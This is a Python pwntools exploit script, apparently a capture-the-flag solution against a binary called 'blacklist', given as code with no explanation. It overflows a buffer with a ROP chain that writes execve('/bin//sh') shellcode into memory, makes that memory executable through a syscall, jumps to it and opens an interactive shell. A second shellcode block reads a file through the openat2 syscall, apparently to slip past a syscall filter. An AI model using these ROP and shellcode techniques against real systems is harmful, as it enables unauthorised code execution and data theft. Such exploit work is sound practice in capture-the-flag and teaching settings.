from pwn import *
import sys
import os

remote_ip,port = '',''
binary = 'blacklist'
brkpts = '''
b*0x401dd3
b*0x4b2000'''

if sys.argv[1] == 'remote' :
    io = remote(remote_ip,port)
    
else:
    io = process(binary)
    #gdb.attach(io,brkpts)

pop_rax = 0x401daf
add_rax_3 = 0x0000000000469df0
mov_rax = 0x0000000000469e70
pop_rdi = 0x00000000004017b6
pop_rsi = 0x00000000004024f6
syscall_ret = 0x0041860c
pop_rdx = 0x0000000000401db2
mov_rsi_rax = 0x4739b1
pop_rsp = 0x0000000000401fab

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda a: io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

string = "/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt"
list = []
for i in range(0,len(string)-8+1,8):
    list.append(string[i:i+8])

bytes = []
for item in list:
    s = ""
    for i in range(7,-1,-1):
        s+=hex(ord(item[i])).replace("0x","")
    bytes.append("0x"+s)

bytes.reverse()
instructions = ""
for i in bytes:
    instructions += "mov r9, {}\npush r9\n".format(i)


shellcode=asm(
    '''
    {}

    mov rsi, rsp
    mov rdi, 0x0
    mov rdx, 0x0
    mov r10, 0x0
    mov rax, 0x257
    syscall

    mov rdi, rax
    mov r8, rax
    mov rsi, rsp
    mov rdx, 0x40
    mov rax, 0x0
    syscall

    mov rdi, 0x1
    mov rsi, r8
    mov rdx, 0x0
    mov r10, 0x40
    syscall
    '''.format(instructions)
)

if __name__== "__main__":
    payload = 'a'*72
    payload += p64(pop_rsi)
    payload += p64(0x4b2000)
    payload += p64(pop_rax)
    payload += p64(0x48f63148d2314850)
    payload +=p64(mov_rsi_rax)

    payload += p64(pop_rsi)
    payload += p64(0x4b2000+8)
    payload += p64(pop_rax)
    payload += p64(0x732f2f6e69622fbb)
    payload +=p64(mov_rsi_rax)

    payload += p64(pop_rsi)
    payload += p64(0x4b2000+16)
    payload += p64(pop_rax)
    payload += p64(0x050f3bb05f545368)
    payload +=p64(mov_rsi_rax)


    payload += p64(mov_rax)    
    payload += p64(add_rax_3)
    payload += p64(pop_rdi)
    payload += p64(0x4b2000) #start of addr 
    payload += p64(pop_rsi)
    payload += p64(2000)
    payload += p64(pop_rdx)
    payload += p64(7)
    payload += p64(syscall_ret)
    payload += p64(0x4b2000)


    sl(payload)
    io.interactive()